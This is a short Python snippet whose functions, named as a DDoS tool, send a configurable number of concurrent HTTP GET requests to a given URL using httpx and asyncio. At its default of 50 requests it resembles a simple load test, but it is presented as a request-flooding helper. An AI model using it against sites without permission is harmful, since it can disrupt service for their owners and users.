import asyncio
import httpx


async def async_ddos(url, count=50):
    client = httpx.AsyncClient()
    futures = []
    for i in range(count):
        futures.append(client.get(url))
    return await asyncio.gather(*futures)


def ddos(url, count=50):
    return asyncio.run(async_ddos(url, count=count))
